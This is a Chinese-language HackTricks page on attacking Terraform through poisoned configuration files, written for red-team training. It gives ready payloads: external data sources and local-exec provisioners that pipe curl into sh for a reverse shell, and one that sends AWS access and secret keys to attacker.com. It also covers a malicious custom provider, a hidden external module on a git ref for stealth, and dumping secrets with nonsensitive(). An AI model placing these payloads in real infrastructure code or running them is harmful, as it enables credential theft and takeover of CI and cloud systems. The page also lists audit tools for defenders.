# Terraform 安全性

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 基本信息

HashiCorp Terraform 是一种**基础设施即代码工具**，它允许您在可版本控制、重用和共享的人类可读配置文件中定义**云和本地资源**。然后，您可以使用一致的工作流程来配置和管理您的所有基础设施的整个生命周期。Terraform 可以管理低级组件，如计算、存储和网络资源，以及高级组件，如 DNS 条目和 SaaS 功能。

### Terraform 如何工作？

Terraform 通过云平台和其他服务的应用程序编程接口 (API) 创建和管理资源。提供者使 Terraform 能够与几乎任何具有可访问 API 的平台或服务一起工作。

![](<../../.gitbook/assets/image (33).png>)

HashiCorp 和 Terraform 社区已经编写了**超过 1700 个提供者**来管理数千种不同类型的资源和服务，这个数字还在持续增长。您可以在 [Terraform 注册表](https://registry.terraform.io/)上找到所有公开可用的提供者，包括 Amazon Web Services (AWS)、Azure、Google Cloud Platform (GCP)、Kubernetes、Helm、GitHub、Splunk、DataDog 等等。

Terraform 的核心工作流程包括三个阶段：

* **编写：** 您定义资源，这些资源可能跨越多个云提供商和服务。例如，您可能创建一个配置，在虚拟私有云 (VPC) 网络中的虚拟机上部署应用程序，并带有安全组和负载均衡器。
* **计划：** Terraform 创建一个执行计划，描述基于现有基础设施和您的配置将创建、更新或销毁的基础设施。
* **应用：** 经过批准后，Terraform 按照正确的顺序执行建议的操作，尊重任何资源依赖关系。例如，如果您更新了 VPC 的属性并更改了该 VPC 中的虚拟机数量，Terraform 将在扩展虚拟机之前重新创建 VPC。

![](<../../.gitbook/assets/image (81).png>)

### Terraform 企业版

Terraform 企业版允许您在**自托管的 Terraform Cloud 版本**中远程**运行命令**，如 `terraform plan` 或 `terraform apply`。因此，如果您找到了访问该 Terraform 服务器的**API 密钥**，您可以**危害它**。\
更多信息请查看：

{% content-ref url="terraform-enterprise-security.md" %}
[terraform-enterprise-security.md](terraform-enterprise-security.md)
{% endcontent-ref %}

## Terraform 实验室

只需在您的计算机上安装 terraform。

这里有一个[指南](https://learn.hashicorp.com/tutorials/terraform/install-cli)，这里有[下载 terraform 的最佳方式](https://www.terraform.io/downloads)。

## Terraform 中的 RCE

Terraform **没有暴露网页或网络服务的平台**我们可以枚举，因此，危害 terraform 的唯一方法是**能够添加/修改 terraform 配置文件**。

然而，terraform 是一个**非常敏感的组件**，因为它将拥有**特权访问**不同位置，以便正常工作。

攻击者能够危害运行 terraform 的系统的主要方式是**危害存储 terraform 配置的仓库**，因为它们在某个时刻将被**解释**。

实际上，有一些解决方案在创建 PR 后会**自动执行 terraform 计划/应用**，例如 **Atlantis**：

{% content-ref url="../atlantis-security.md" %}
[atlantis-security.md](../atlantis-security.md)
{% endcontent-ref %}

如果您能够危害一个 terraform 文件，当有人执行 `terraform plan` 或 `terraform apply` 时，您可以通过不同的方式执行 RCE。

### Terraform 计划

Terraform 计划是 terraform 中**最常用的命令**，开发人员/使用 terraform 的解决方案一直在调用它，因此**获得 RCE 的最简单方法**是确保您污染了一个将在 `terraform plan` 中执行任意命令的 terraform 配置文件。

#### 使用外部提供者

Terraform 提供了 [`external` 提供者](https://registry.terraform.io/providers/hashicorp/external/latest/docs)，它提供了一种在 Terraform 和外部程序之间进行接口的方法。您可以使用 `external` 数据源在 `plan` 期间运行任意代码。

在 terraform 配置文件中注入类似以下内容将在执行 `terraform plan` 时执行反向 shell：
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### 使用自定义提供者

任何人都可以编写一个[自定义提供者](https://learn.hashicorp.com/tutorials/terraform/provider-setup)并将其发布到[Terraform Registry](https://registry.terraform.io/)。您也可以尝试从私有注册表中拉取自定义提供者。

就是这样：

* 编写一个运行恶意代码的自定义提供者（如泄露凭证或客户数据）
* 将其发布到 Terraform Registry
* 在功能分支中添加该提供者到 Terraform 代码
* 为功能分支打开一个 PR
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
```markdown
由于提供者将在 `init` 期间被拉入，并在 `plan` 期间运行一些代码，你有任意代码执行的能力。

你可以在 [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) 找到一个例子

#### 使用外部引用

上述两个选项都很有用，但不是非常隐蔽（第二个更隐蔽但比第一个复杂）。你可以通过遵循以下建议，以更**隐蔽的方式**执行此攻击：

* 与其直接将 rev shell 添加到 terraform 文件中，不如**加载包含 rev shell 的外部资源**：
```
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
您可以在 [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules) 找到反向 shell 代码

* 在外部资源中，使用 **ref** 功能在仓库内部的一个分支中隐藏 **terraform 反向 shell 代码**，类似于：`git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform 应用

Terraform apply 将被执行以应用所有更改，您也可以通过注入**恶意的 Terraform 文件**与 [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html) 来滥用它以获得 RCE。\
您只需确保像下面这样的有效载荷最终出现在 `main.tf` 文件中：
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
遵循**前一技巧的建议**，使用**外部引用**以更隐秘的方式执行此攻击。

## Secrets Dumps

您可以通过在 terraform 文件中添加如下内容，运行 `terraform apply` 来**转储 terraform 使用的秘密值**：
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## 审计工具

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec 使用静态分析你的 terraform 代码来发现潜在的配置错误。
* [**terascan**](https://github.com/tenable/terrascan): Terrascan 是针对基础设施即代码的静态代码分析器。

## 参考资料

* [Atlantis 安全](../atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>

其他支持 HackTricks 的方式：

* 如果你想在 HackTricks 中看到你的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享你的黑客技巧。

</details>
